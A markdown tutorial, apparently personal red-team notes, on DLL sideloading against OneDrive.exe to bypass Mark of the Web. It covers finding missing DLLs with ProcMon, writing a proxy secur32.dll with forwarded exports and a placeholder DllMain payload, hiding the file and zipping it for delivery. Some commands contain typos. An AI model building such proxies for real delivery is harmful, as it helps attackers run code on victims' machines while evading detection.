# DLL Sideloading
Exploits the behaviour of Microsoft signed binaries and how the handle DLL loading to bypass MotW (Mark of the Web). 

## Tools
ProcMon

## What is Sideloading?
- Windows applications load Dynamic Link Libraries (DLLs) 
- If an application loads a DLL without specifying the absolute path it may be vulnerable. 
- If a dll is not found, the application will check the application working directory first.
- Identify a vulnerable dll using procmon
- Write your exploit & forward functions to original dll
- Set a hidden attribute on the file & zip it.

### Windows DLL Search Order
1. Application working directory
2. System32
3. 16-bit system directory
4. Windows directory
5. Current Working directory
6. PATH environment variable

### Mitigations
- Use secure API calls like `LoadLibraryExA()` with `LOAD_LIBRARY_SEARCH_*` flags.
- Configure the DLL search path expliticity using `SetDefault DllDirectories()` or `AddDllDirectory()`

## 1. Identify Suitable Binary
This attack will use `OneDrive.exe` 

ProcMon will allow us to view a detailed log of what our target application is doing.

Set the following filters in procmon (Reflected in window with a green checkmark):

1. Set `ProcessName` contains  "OneDrive" then include
2. Set `Operation` is "CreateFile" then include
3. Set `Result` is "NAME NOT FOUND" then include
4. Set `Path` endswith "dll" then include
5. Set `ProcessName` is "procmon.exe" then exclude

At this point we can now run `OneDrive.exe` to review it's processes.

The filtered data will now contain candidates for DLL sideloading.

| Path | Result |
| ---- | ------ |
| Secur32.dll | NAME NOT FOUND |
| VERSION.dll | NAME NOT FOUND |
| WININET.dll | NAME NOT FOUND |
| WTSAPI32.dll | NAME NOT FOUND |

## 2. DLL Proxying
The goal here is to mimic the operation of the original file while executing our malicious code. This is done by:
- Using the same filename
- Exporting expected functions
- Forwarding legitimate calls to real original dll


### 2.1 Forwarding Functions
Functions are forwarded with the following line. Use the [Powershell dll proxy script](../Tools/dll-proxy.ps1) to generate a template proxy.
```cpp
#pragma comment(linker, "/EXPORT:GetUserNameExW=C:\\Windows\\System32\secur32.GetUserNameExW")
```

### 2.2 Payload
Your code will be written under the `DLL_PROCESS_ATTACH` predefined constant that represents the initial load event. 
```cpp
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReserved)
{
    switch (fwdReason)
    {
        case DLL_PROCESS_ATTACH:
        {
            MessageBoxA(NULL, "YEAH, Sideloading! ", "The call is coming from inside the container!",0);
        }
        case DLL_THREAD_ATTACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

## 3. Compile
To compile your dell you will need to create 2 files:

secur32.h
```cpp
#ifdef BUILD_DLL
#define DLLEXPORT __declspec(dllexport)
#else
#define DLLEXPORT __declspec(dllimport)
#endif
```

secur32.cpp (shortend)
```cpp
#pragma once
#pragma comment (lib, "user32.lib")
... 
#pragma comment (linker, "/export:VerifySignature=C:\\Windows\\System32\\secur32.VerifySignature")

#include <Windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReserved)
{
    switch (fwdReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL,"Test","DLL Test",0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Using a developer prompt (or set PATH) run the following to compile your dll.
```sh
cl /LD secur32.cpp
```
## 4. Test exploit
To simulate this attack `cp` the original onedrive.exe to your working directory and launch it. 

## 5. Zip
Remove the file from showing in explorer. 
- Will not work if "show hidden files" is enabled
```sh
attrib +h secur32.dll
```

Zip the container
```sh
7z.exea -tzip onedrive.zip.\OneDrive.exe
```

# Troubleshooting:

## 1. How to view export in dll:
```asm
dumpbin /exports YourLibrary.dll
```
At this point I was having some issue getting feedback. Some key areas you need to check

## 2. Compiling, but no feedback
My issue here was that I did not compile using the x64 Native tools prompt. 

Here are some other paths I tried:
1. Bitness
- Make sure your target is 64 bit and your dll proxy is compiled as 64 bit
- DebugView from sysinternals
- Right click process column name
- Add Image type

## 3. Confirm DLL is loaded
- Can you see it using ProcMon, if you don't it loaded.
